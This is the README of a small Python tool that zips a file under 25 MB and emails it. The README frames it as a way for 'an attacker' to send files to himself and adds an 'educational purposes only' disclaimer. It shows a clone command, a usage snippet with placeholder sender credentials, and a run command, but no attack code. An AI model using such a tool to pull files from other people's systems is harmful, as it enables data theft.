# File Emailer

## Disclaimer

This script is for educational purposes only, I don't endorse or promote it's illegal usage

## Table of Contents

1. [Overview](#overview)
2. [Features](#features)
3. [Languages](#languages)
4. [Installations](#installations)
5. [Usage](#usage)
6. [Run](#run)

## Overview

This script allows an attacker to send files <25mb to his email

## Features

- Zips file before sending it through the email

## Languages

- Python 3.9.7

## Installations

```shell
git clone https://github.com/favoursyre/file-emailer.git && cd file-emailer
```

## Usage

Instantiating the class

```python
file = "filename.ext"
subject = "Email subject"
content = "Email content"
sender_ = "sender-email-address"
receiver = "receiver-email-address"
password = "sender-email-password"
stat = emailer(file, subject, content, sender_, receiver, password)
```

## Run

```bash
python emailer.py
```
